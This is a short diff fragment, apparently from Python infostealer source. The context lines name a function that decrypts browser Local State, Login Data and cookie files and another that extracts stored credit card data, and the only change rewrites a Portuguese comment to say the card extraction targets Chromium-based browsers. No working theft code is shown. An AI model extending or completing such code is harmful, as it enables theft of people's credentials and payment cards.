@@ -188,7 +188,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
 
     return message.strip()
 
-# Função para extrair dados de cartão de crédito
+# Função para extrair dados de cartão de crédito baseados em Chromium
 def extrair_cartao_credito(LocalState, LoginData):
     message = ""
     try:
